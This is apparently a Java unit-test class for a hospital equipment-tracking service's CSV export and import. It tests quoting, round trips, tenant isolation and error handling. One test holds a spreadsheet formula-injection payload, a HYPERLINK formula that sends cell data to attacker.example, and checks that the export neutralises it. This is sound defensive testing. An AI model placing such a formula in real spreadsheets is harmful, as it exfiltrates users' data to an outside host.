package com.medtrack.service;

import com.medtrack.auth.model.User;
import com.medtrack.auth.repository.UserRepository;
import com.medtrack.dto.EquipmentImportSummary;
import com.medtrack.model.Equipment;
import com.medtrack.model.EquipmentCategory;
import com.medtrack.model.EquipmentImportAuditLog;
import com.medtrack.model.EquipmentStatus;
import com.medtrack.model.Hospital;
import com.medtrack.repository.EquipmentImportAuditLogRepository;
import com.medtrack.repository.EquipmentRepository;
import com.medtrack.repository.HospitalRepository;
import com.medtrack.util.CsvSupport;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.extension.ExtendWith;
import org.mockito.ArgumentCaptor;
import org.mockito.InjectMocks;
import org.mockito.Mock;
import org.mockito.junit.jupiter.MockitoExtension;
import org.springframework.mock.web.MockMultipartFile;

import java.nio.charset.StandardCharsets;
import java.time.LocalDate;
import java.util.List;
import java.util.Optional;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertThrows;
import static org.junit.jupiter.api.Assertions.assertTrue;
import static org.mockito.ArgumentMatchers.anyList;
import static org.mockito.Mockito.lenient;
import static org.mockito.Mockito.verify;
import static org.mockito.Mockito.when;

/**
 * End-to-end behaviour of the equipment CSV export and import through {@link EquipmentService}.
 *
 * <p>{@link com.medtrack.util.CsvSupportTest} covers the encoding rules in isolation; this class
 * covers what the service does with them — column alignment, the export/import round trip, and
 * error classification.</p>
 */
@ExtendWith(MockitoExtension.class)
@DisplayName("EquipmentService CSV")
class EquipmentCsvServiceTest {

    private static final String USERNAME = "hospital_admin";
    private static final Long HOSPITAL_ID = 10L;

    @Mock
    private EquipmentRepository equipmentRepository;

    @Mock
    private HospitalRepository hospitalRepository;

    @Mock
    private UserRepository userRepository;

    @Mock
    private EquipmentImportAuditLogRepository equipmentImportAuditLogRepository;

    @InjectMocks
    private EquipmentService equipmentService;

    private Hospital hospital;

    @BeforeEach
    void setUp() {
        User user = User.builder().id(1L).username(USERNAME).build();
        hospital = Hospital.builder().id(HOSPITAL_ID).name("City General").user(user).build();

        lenient().when(userRepository.findByUsername(USERNAME)).thenReturn(Optional.of(user));
        lenient().when(hospitalRepository.findByUserId(1L)).thenReturn(Optional.of(hospital));
    }

    private String exportAsText() {
        String csv = new String(equipmentService.exportEquipmentCsv(USERNAME), StandardCharsets.UTF_8);
        return csv.startsWith(CsvSupport.UTF8_BOM) ? csv.substring(CsvSupport.UTF8_BOM.length()) : csv;
    }

    private static List<String> recordsOf(String csv) {
        return List.of(csv.split("\r\n"));
    }

    // -----------------------------------------------------------------
    // export
    // -----------------------------------------------------------------

    @Test
    @DisplayName("a comma in an asset name no longer shifts every later column")
    void commaInNameDoesNotShiftColumns() {
        when(equipmentRepository.findByHospitalId(HOSPITAL_ID)).thenReturn(List.of(
                Equipment.builder()
                        .equipmentCode("EQ-1002")
                        .name("Ventilator, Portable")
                        .model("Philips V60")
                        .serialNumber("SN-200")
                        .department("ICU")
                        .category(EquipmentCategory.RESPIRATORY)
                        .status(EquipmentStatus.ACTIVE)
                        .purchaseDate(LocalDate.of(2025, 1, 20))
                        .hospital(hospital)
                        .build()));

        List<String> records = recordsOf(exportAsText());
        List<String> header = CsvSupport.parseLine(records.get(0));
        List<String> row = CsvSupport.parseLine(records.get(1));

        assertEquals(header.size(), row.size(),
                "row must have the same column count as the header");
        assertEquals("Ventilator, Portable", row.get(1));
        assertEquals("ICU", row.get(4), "Department must not be shifted by the comma in Name");
    }

    @Test
    @DisplayName("a null warranty date exports as an empty field, not the text 'null'")
    void nullDateExportsEmpty() {
        when(equipmentRepository.findByHospitalId(HOSPITAL_ID)).thenReturn(List.of(
                Equipment.builder()
                        .equipmentCode("EQ-1")
                        .name("Analyser")
                        .department("Lab")
                        .warrantyExpiry(null)
                        .hospital(hospital)
                        .build()));

        List<String> records = recordsOf(exportAsText());
        List<String> header = CsvSupport.parseLine(records.get(0));
        List<String> row = CsvSupport.parseLine(records.get(1));

        int warrantyIndex = header.indexOf("Warranty Expiry");
        assertEquals("", row.get(warrantyIndex));
    }

    @Test
    @DisplayName("a formula in an asset name is neutralised in the export")
    void formulaIsNeutralised() {
        when(equipmentRepository.findByHospitalId(HOSPITAL_ID)).thenReturn(List.of(
                Equipment.builder()
                        .equipmentCode("EQ-1")
                        .name("=HYPERLINK(\"https://attacker.example/?d=\"&A1,\"Click\")")
                        .department("Lab")
                        .hospital(hospital)
                        .build()));

        String csv = exportAsText();

        assertTrue(csv.contains("'=HYPERLINK"),
                "the leading = must be neutralised before a spreadsheet evaluates it");
    }

    @Test
    @DisplayName("the export is CRLF-terminated and BOM-prefixed")
    void exportFormatting() {
        when(equipmentRepository.findByHospitalId(HOSPITAL_ID)).thenReturn(List.of());

        String csv = new String(equipmentService.exportEquipmentCsv(USERNAME), StandardCharsets.UTF_8);

        assertTrue(csv.startsWith(CsvSupport.UTF8_BOM), "Excel needs the BOM to read UTF-8");
        assertTrue(csv.endsWith("\r\n"), "RFC 4180 mandates CRLF between records");
    }

    // -----------------------------------------------------------------
    // round trip
    // -----------------------------------------------------------------

    @Test
    @DisplayName("a file exported by this application can be re-imported")
    void exportedFileIsReimportable() {
        when(equipmentRepository.findByHospitalId(HOSPITAL_ID)).thenReturn(List.of(
                Equipment.builder()
                        .equipmentCode("EQ-1")
                        .name("Ventilator, Portable")
                        .model("Philips V60")
                        .serialNumber("SN-200")
                        .department("ICU")
                        .category(EquipmentCategory.RESPIRATORY)
                        .status(EquipmentStatus.UNDER_MAINTENANCE)
                        .purchaseDate(LocalDate.of(2025, 1, 20))
                        .hospital(hospital)
                        .build()));

        byte[] exported = equipmentService.exportEquipmentCsv(USERNAME);

        EquipmentImportSummary summary = equipmentService.importEquipmentFromCsv(
                new MockMultipartFile("file", "equipment.csv", "text/csv", exported), USERNAME);

        // Before this change the export emitted the enum constant UNDER_MAINTENANCE while the
        // import only accepted "Maintenance", so every row of a self-exported file was rejected.
        assertEquals(0, summary.getFailureCount(),
                () -> "round trip should not fail any row, but got: " + summary.getFailures());
        assertEquals(1, summary.getSuccessCount());

        ArgumentCaptor<List<Equipment>> saved = ArgumentCaptor.forClass(List.class);
        verify(equipmentRepository).saveAll(saved.capture());

        Equipment reimported = saved.getValue().get(0);
        assertEquals("Ventilator, Portable", reimported.getName(),
                "the comma must survive the round trip");
        assertEquals("ICU", reimported.getDepartment());
        assertEquals(EquipmentStatus.UNDER_MAINTENANCE, reimported.getStatus());
        assertEquals(EquipmentCategory.RESPIRATORY, reimported.getCategory());
    }

    // -----------------------------------------------------------------
    // import
    // -----------------------------------------------------------------

    @Test
    @DisplayName("a quoted comma is one field, not two")
    void importKeepsQuotedComma() {
        String csv = "Name,Department,Category,Status\r\n"
                + "\"Ventilator, Portable\",ICU,RESPIRATORY,Operational\r\n";

        EquipmentImportSummary summary = equipmentService.importEquipmentFromCsv(
                new MockMultipartFile("file", "in.csv", "text/csv", csv.getBytes(StandardCharsets.UTF_8)),
                USERNAME);

        assertEquals(1, summary.getSuccessCount(), () -> String.valueOf(summary.getFailures()));

        ArgumentCaptor<List<Equipment>> saved = ArgumentCaptor.forClass(List.class);
        verify(equipmentRepository).saveAll(saved.capture());
        assertEquals("Ventilator, Portable", saved.getValue().get(0).getName());
    }

    @Test
    @DisplayName("an escaped quote is preserved rather than deleted")
    void importPreservesEscapedQuote() {
        String csv = "Name,Department,Category,Status\r\n"
                + "\"Monitor 15\"\" Display\",Ward,MONITORING,Operational\r\n";

        equipmentService.importEquipmentFromCsv(
                new MockMultipartFile("file", "in.csv", "text/csv", csv.getBytes(StandardCharsets.UTF_8)),
                USERNAME);

        ArgumentCaptor<List<Equipment>> saved = ArgumentCaptor.forClass(List.class);
        verify(equipmentRepository).saveAll(saved.capture());
        assertEquals("Monitor 15\" Display", saved.getValue().get(0).getName());
    }

    @Test
    @DisplayName("equipment code and warranty expiry survive the round trip")
    void codeAndWarrantySurviveRoundTrip() {
        // Both columns are written by the export and were never read back on import, so a round trip
        // minted a fresh equipment code and dropped the warranty date entirely - the two columns were
        // write-only, which made re-importing an export create duplicates rather than update.
        when(equipmentRepository.findByHospitalId(HOSPITAL_ID)).thenReturn(List.of(
                Equipment.builder()
                        .equipmentCode("EQ-1001")
                        .name("MRI Scanner")
                        .department("Radiology")
                        .category(EquipmentCategory.IMAGING)
                        .status(EquipmentStatus.ACTIVE)
                        .purchaseDate(LocalDate.of(2024, 3, 1))
                        .warrantyExpiry(LocalDate.of(2027, 3, 1))
                        .hospital(hospital)
                        .build()));

        byte[] exported = equipmentService.exportEquipmentCsv(USERNAME);

        equipmentService.importEquipmentFromCsv(
                new MockMultipartFile("file", "equipment.csv", "text/csv", exported), USERNAME);

        ArgumentCaptor<List<Equipment>> saved = ArgumentCaptor.forClass(List.class);
        verify(equipmentRepository).saveAll(saved.capture());
        Equipment reimported = saved.getValue().get(0);

        assertEquals("EQ-1001", reimported.getEquipmentCode(),
                "the exported code must be preserved, not replaced with a fresh UUID");
        assertEquals(LocalDate.of(2027, 3, 1), reimported.getWarrantyExpiry());
        assertEquals(LocalDate.of(2024, 3, 1), reimported.getPurchaseDate());
    }

    @Test
    @DisplayName("an embedded newline survives the round trip")
    void embeddedNewlineSurvivesRoundTrip() {
        when(equipmentRepository.findByHospitalId(HOSPITAL_ID)).thenReturn(List.of(
                Equipment.builder()
                        .equipmentCode("EQ-2")
                        .name("Ventilator\nSecond line")
                        .department("ICU")
                        .category(EquipmentCategory.RESPIRATORY)
                        .status(EquipmentStatus.ACTIVE)
                        .hospital(hospital)
                        .build()));

        byte[] exported = equipmentService.exportEquipmentCsv(USERNAME);

        EquipmentImportSummary summary = equipmentService.importEquipmentFromCsv(
                new MockMultipartFile("file", "equipment.csv", "text/csv", exported), USERNAME);

        assertEquals(0, summary.getFailureCount(), () -> String.valueOf(summary.getFailures()));

        ArgumentCaptor<List<Equipment>> saved = ArgumentCaptor.forClass(List.class);
        verify(equipmentRepository).saveAll(saved.capture());
        assertEquals("Ventilator\nSecond line", saved.getValue().get(0).getName(),
                "the quoted newline must stay in one record; a readLine() loop split it in two");
    }

    @Test
    @DisplayName("a non-ASCII asset name survives regardless of the platform charset")
    void nonAsciiSurvivesRoundTrip() {
        // The import used InputStreamReader with no charset, so it decoded with the platform default.
        // On a JVM defaulting to Windows-1252 the BOM decoded to three stray characters and every
        // non-ASCII name was mangled.
        when(equipmentRepository.findByHospitalId(HOSPITAL_ID)).thenReturn(List.of(
                Equipment.builder()
                        .equipmentCode("EQ-3")
                        .name("Röntgengerät \u00b5-Scan")
                        .department("Radiologie")
                        .category(EquipmentCategory.IMAGING)
                        .status(EquipmentStatus.ACTIVE)
                        .hospital(hospital)
                        .build()));

        byte[] exported = equipmentService.exportEquipmentCsv(USERNAME);

        equipmentService.importEquipmentFromCsv(
                new MockMultipartFile("file", "equipment.csv", "text/csv", exported), USERNAME);

        ArgumentCaptor<List<Equipment>> saved = ArgumentCaptor.forClass(List.class);
        verify(equipmentRepository).saveAll(saved.capture());
        assertEquals("Röntgengerät \u00b5-Scan", saved.getValue().get(0).getName());
    }

    @Test
    @DisplayName("re-importing an export updates the existing asset instead of duplicating it")
    void reimportUpdatesRatherThanDuplicates() {
        Equipment stored = Equipment.builder()
                .id(500L)
                .equipmentCode("EQ-1001")
                .name("MRI Scanner")
                .department("Radiology")
                .category(EquipmentCategory.IMAGING)
                .status(EquipmentStatus.ACTIVE)
                .hospital(hospital)
                .build();

        // equipmentCode carries a unique constraint, so building a fresh entity for a code that
        // already exists would violate it and fail the whole batch. The mocked repository in the
        // other round-trip test cannot enforce that, which is exactly why this case is asserted on
        // the resolved entity instead.
        when(equipmentRepository.findByEquipmentCode("EQ-1001")).thenReturn(Optional.of(stored));

        String csv = "Equipment Code,Name,Department,Category,Status\r\n"
                + "EQ-1001,MRI Scanner Mk2,Imaging Suite,IMAGING,Maintenance\r\n";

        EquipmentImportSummary summary = equipmentService.importEquipmentFromCsv(
                new MockMultipartFile("file", "in.csv", "text/csv", csv.getBytes(StandardCharsets.UTF_8)),
                USERNAME);

        assertEquals(1, summary.getSuccessCount(), () -> String.valueOf(summary.getFailures()));

        ArgumentCaptor<List<Equipment>> saved = ArgumentCaptor.forClass(List.class);
        verify(equipmentRepository).saveAll(saved.capture());

        Equipment result = saved.getValue().get(0);
        assertEquals(500L, result.getId(), "the existing row must be updated, not a new one inserted");
        assertEquals("MRI Scanner Mk2", result.getName());
        assertEquals("Imaging Suite", result.getDepartment());
        assertEquals(EquipmentStatus.UNDER_MAINTENANCE, result.getStatus());
    }

    @Test
    @DisplayName("a code owned by another hospital is refused, not adopted")
    void refusesAnotherHospitalsCode() {
        Hospital other = Hospital.builder().id(99L).name("Rival Trust").build();
        Equipment theirs = Equipment.builder()
                .id(900L)
                .equipmentCode("EQ-9999")
                .name("Their Scanner")
                .hospital(other)
                .build();

        when(equipmentRepository.findByEquipmentCode("EQ-9999")).thenReturn(Optional.of(theirs));

        String csv = "Equipment Code,Name,Department,Category,Status\r\n"
                + "EQ-9999,Hijacked,Radiology,IMAGING,Operational\r\n";

        EquipmentImportSummary summary = equipmentService.importEquipmentFromCsv(
                new MockMultipartFile("file", "in.csv", "text/csv", csv.getBytes(StandardCharsets.UTF_8)),
                USERNAME);

        // Adopting the row would let one tenant overwrite another's asset just by naming its code
        // in an uploaded file.
        assertEquals(0, summary.getSuccessCount());
        assertEquals(1, summary.getFailureCount());
        assertTrue(summary.getFailures().get(0).getReason().contains("another hospital"),
                summary.getFailures().get(0).getReason());
        verify(equipmentRepository, org.mockito.Mockito.never()).saveAll(anyList());
    }

    @Test
    @DisplayName("a stray quote is rejected with a reason rather than silently corrected")
    void strayQuoteRejectsTheDocument() {
        // `Oper"ational` previously parsed as `Operational` and then passed status validation, so
        // malformed input was quietly turned into valid-looking data.
        //
        // It is rejected at document level, not per row, and that is the correct scope: an unbalanced
        // quote makes record boundaries ambiguous, because the only quote-consistent reading is that
        // everything after it is one field. Importing the rows before it and mis-assigning the rest
        // would be worse than refusing the file.
        String csv = "Name,Department,Category,Status\r\n"
                + "Good,Lab,LABORATORY,Operational\r\n"
                + "Bad,Lab,LABORATORY,Oper\"ational\r\n";

        CsvSupport.MalformedCsvException error = assertThrows(
                CsvSupport.MalformedCsvException.class,
                () -> equipmentService.importEquipmentFromCsv(
                        new MockMultipartFile("file", "in.csv", "text/csv",
                                csv.getBytes(StandardCharsets.UTF_8)),
                        USERNAME));

        // MalformedCsvException extends IllegalArgumentException, so the existing advice mapping
        // renders it as a 400 with the reason intact rather than a 500.
        assertTrue(error instanceof IllegalArgumentException);
        assertTrue(error.getMessage().contains("Unterminated quoted field"), error.getMessage());
        verify(equipmentRepository, org.mockito.Mockito.never()).saveAll(anyList());
    }

    @Test
    @DisplayName("a row malformed without unbalancing quotes fails alone, and the rest still imports")
    void balancedButMalformedRowFailsAlone() {
        // Quotes are balanced here, so record boundaries are unambiguous and the damage can be
        // contained to the offending row: text after a closing quote is malformed, but only this row.
        String csv = "Name,Department,Category,Status\r\n"
                + "Good,Lab,LABORATORY,Operational\r\n"
                + "\"Bad\"extra,Lab,LABORATORY,Operational\r\n";

        EquipmentImportSummary summary = equipmentService.importEquipmentFromCsv(
                new MockMultipartFile("file", "in.csv", "text/csv", csv.getBytes(StandardCharsets.UTF_8)),
                USERNAME);

        assertEquals(1, summary.getSuccessCount(), "the well-formed row must still import");
        assertEquals(1, summary.getFailureCount());
        assertTrue(summary.getFailures().get(0).getReason().contains("after a closing quote"),
                summary.getFailures().get(0).getReason());
    }

    @Test
    @DisplayName("the invalid-status message lists every accepted value")
    void invalidStatusMessageIsCurrent() {
        String csv = "Name,Department,Category,Status\r\nA,Lab,LABORATORY,Exploded\r\n";

        EquipmentImportSummary summary = equipmentService.importEquipmentFromCsv(
                new MockMultipartFile("file", "in.csv", "text/csv", csv.getBytes(StandardCharsets.UTF_8)),
                USERNAME);

        String reason = summary.getFailures().get(0).getReason();

        // The message previously listed only the three display names while the import had been
        // widened to accept the enum constants too, so it told the user a value was invalid while
        // omitting half the values that would have worked.
        for (String accepted : new String[] {
                "Operational", "Maintenance", "Retired", "ACTIVE", "UNDER_MAINTENANCE", "RETIRED"}) {
            assertTrue(reason.contains(accepted), accepted + " missing from: " + reason);
        }
    }

    @Test
    @DisplayName("a leading BOM does not break the first header column")
    void importToleratesBom() {
        String csv = CsvSupport.UTF8_BOM + "Name,Department,Category,Status\r\n"
                + "Analyser,Lab,LABORATORY,Operational\r\n";

        EquipmentImportSummary summary = equipmentService.importEquipmentFromCsv(
                new MockMultipartFile("file", "in.csv", "text/csv", csv.getBytes(StandardCharsets.UTF_8)),
                USERNAME);

        assertEquals(1, summary.getSuccessCount(), () -> String.valueOf(summary.getFailures()));
    }

    @Test
    @DisplayName("both display names and enum constants are accepted for status")
    void importAcceptsBothStatusVocabularies() {
        String csv = "Name,Department,Category,Status\r\n"
                + "A,Lab,LABORATORY,Maintenance\r\n"
                + "B,Lab,LABORATORY,UNDER_MAINTENANCE\r\n"
                + "C,Lab,LABORATORY,Retired\r\n"
                + "D,Lab,LABORATORY,ACTIVE\r\n";

        EquipmentImportSummary summary = equipmentService.importEquipmentFromCsv(
                new MockMultipartFile("file", "in.csv", "text/csv", csv.getBytes(StandardCharsets.UTF_8)),
                USERNAME);

        assertEquals(4, summary.getSuccessCount(), () -> String.valueOf(summary.getFailures()));

        ArgumentCaptor<List<Equipment>> saved = ArgumentCaptor.forClass(List.class);
        verify(equipmentRepository).saveAll(saved.capture());
        List<Equipment> rows = saved.getValue();
        assertEquals(EquipmentStatus.UNDER_MAINTENANCE, rows.get(0).getStatus());
        assertEquals(EquipmentStatus.UNDER_MAINTENANCE, rows.get(1).getStatus());
        assertEquals(EquipmentStatus.RETIRED, rows.get(2).getStatus());
        assertEquals(EquipmentStatus.ACTIVE, rows.get(3).getStatus());
    }

    @Test
    @DisplayName("an unknown status is reported as a row failure, not a crash")
    void importRejectsUnknownStatus() {
        String csv = "Name,Department,Category,Status\r\n"
                + "A,Lab,LABORATORY,Exploded\r\n";

        EquipmentImportSummary summary = equipmentService.importEquipmentFromCsv(
                new MockMultipartFile("file", "in.csv", "text/csv", csv.getBytes(StandardCharsets.UTF_8)),
                USERNAME);

        assertEquals(0, summary.getSuccessCount());
        assertEquals(1, summary.getFailureCount());
        assertTrue(summary.getFailures().get(0).getReason().contains("Invalid condition/status"));
    }

    // -----------------------------------------------------------------
    // error classification
    // -----------------------------------------------------------------

    @Test
    @DisplayName("a malformed file reports its own reason instead of a generic wrapper")
    void validationErrorsKeepTheirMessage() {
        // The try block raises IllegalArgumentException for these. The old
        // `catch (Exception e) { throw new RuntimeException("Error reading CSV file", e); }`
        // swallowed the reason and turned a user-fixable input problem into a 500.
        IllegalArgumentException tooFewColumns = assertThrows(IllegalArgumentException.class, () ->
                equipmentService.importEquipmentFromCsv(
                        new MockMultipartFile("file", "in.csv", "text/csv",
                                "Name,Department\r\n".getBytes(StandardCharsets.UTF_8)),
                        USERNAME));
        assertTrue(tooFewColumns.getMessage().contains("must contain at least"),
                tooFewColumns.getMessage());

        IllegalArgumentException empty = assertThrows(IllegalArgumentException.class, () ->
                equipmentService.importEquipmentFromCsv(
                        new MockMultipartFile("file", "in.csv", "text/csv", new byte[0]), USERNAME));
        assertTrue(empty.getMessage().contains("empty") || empty.getMessage().contains("no content"),
                empty.getMessage());
    }

    @Test
    @DisplayName("nothing is saved when every row fails")
    void nothingSavedWhenAllRowsFail() {
        String csv = "Name,Department,Category,Status\r\n"
                + ",Lab,LABORATORY,Operational\r\n";

        EquipmentImportSummary summary = equipmentService.importEquipmentFromCsv(
                new MockMultipartFile("file", "in.csv", "text/csv", csv.getBytes(StandardCharsets.UTF_8)),
                USERNAME);

        assertEquals(1, summary.getFailureCount());
        verify(equipmentRepository, org.mockito.Mockito.never()).saveAll(anyList());
    }

    @Test
    @DisplayName("two rows claiming the same equipment code are rejected, not both saved")
    void duplicateCodeWithinTheFileIsRejected() {
        when(equipmentRepository.findByEquipmentCode("EQ-1001")).thenReturn(Optional.empty());

        // equipmentCode is a unique column. Building two entities for it would fail the whole batch
        // inside saveAll with a constraint violation, reported to the caller as a 500 for what is a
        // fixable problem in their own file - and taking every valid row down with it.
        String csv = "Equipment Code,Name,Department,Category,Status\r\n"
                + "EQ-1001,First,Radiology,IMAGING,Operational\r\n"
                + "EQ-1001,Second,Radiology,IMAGING,Operational\r\n";

        EquipmentImportSummary summary = equipmentService.importEquipmentFromCsv(
                new MockMultipartFile("file", "in.csv", "text/csv", csv.getBytes(StandardCharsets.UTF_8)),
                USERNAME);

        assertEquals(1, summary.getSuccessCount(), "the first row is valid and must still import");
        assertEquals(1, summary.getFailureCount());
        assertTrue(summary.getFailures().get(0).getReason().contains("Duplicate Equipment Code"),
                summary.getFailures().get(0).getReason());
        assertEquals(3, summary.getFailures().get(0).getRowNumber(),
                "the second data row is row 3 once the header is counted");

        ArgumentCaptor<List<Equipment>> saved = ArgumentCaptor.forClass(List.class);
        verify(equipmentRepository).saveAll(saved.capture());
        assertEquals(1, saved.getValue().size());
        assertEquals("First", saved.getValue().get(0).getName());
    }

    @Test
    @DisplayName("re-importing an unchanged row does not trip the serial number check on itself")
    void upsertDoesNotRejectARowOnItsOwnSerialNumber() {
        Equipment stored = Equipment.builder()
                .id(500L)
                .equipmentCode("EQ-1001")
                .serialNumber("SN-777")
                .name("MRI Scanner")
                .hospital(hospital)
                .build();

        when(equipmentRepository.findByEquipmentCode("EQ-1001")).thenReturn(Optional.of(stored));
        when(equipmentRepository.findBySerialNumber("SN-777")).thenReturn(Optional.of(stored));

        // The row's own stored asset already holds this serial number. An unqualified
        // "already exists" check would reject every re-import of an unchanged export.
        String csv = "Equipment Code,Name,Serial Number,Department,Category,Status\r\n"
                + "EQ-1001,MRI Scanner,SN-777,Radiology,IMAGING,Operational\r\n";

        EquipmentImportSummary summary = equipmentService.importEquipmentFromCsv(
                new MockMultipartFile("file", "in.csv", "text/csv", csv.getBytes(StandardCharsets.UTF_8)),
                USERNAME);

        assertEquals(1, summary.getSuccessCount(), () -> String.valueOf(summary.getFailures()));
        assertEquals(0, summary.getFailureCount());

        ArgumentCaptor<List<Equipment>> saved = ArgumentCaptor.forClass(List.class);
        verify(equipmentRepository).saveAll(saved.capture());
        assertEquals(500L, saved.getValue().get(0).getId(), "the stored row must be updated in place");
    }

    @Test
    @DisplayName("a serial number held by a different asset is still rejected")
    void serialNumberHeldByAnotherAssetIsStillRejected() {
        Equipment other = Equipment.builder()
                .id(600L)
                .equipmentCode("EQ-2002")
                .serialNumber("SN-777")
                .hospital(hospital)
                .build();

        // No findByEquipmentCode stub: the serial-number check runs first and short-circuits the
        // row, so the code lookup is never reached.
        when(equipmentRepository.findBySerialNumber("SN-777")).thenReturn(Optional.of(other));

        String csv = "Equipment Code,Name,Serial Number,Department,Category,Status\r\n"
                + "EQ-1001,Imposter,SN-777,Radiology,IMAGING,Operational\r\n";

        EquipmentImportSummary summary = equipmentService.importEquipmentFromCsv(
                new MockMultipartFile("file", "in.csv", "text/csv", csv.getBytes(StandardCharsets.UTF_8)),
                USERNAME);

        // Narrowing the check to "another asset holds it" must not weaken it to "never checked".
        assertEquals(0, summary.getSuccessCount());
        assertEquals(1, summary.getFailureCount());
        assertTrue(summary.getFailures().get(0).getReason().contains("Serial Number already exists"),
                summary.getFailures().get(0).getReason());
        verify(equipmentRepository, org.mockito.Mockito.never()).saveAll(anyList());
    }

}
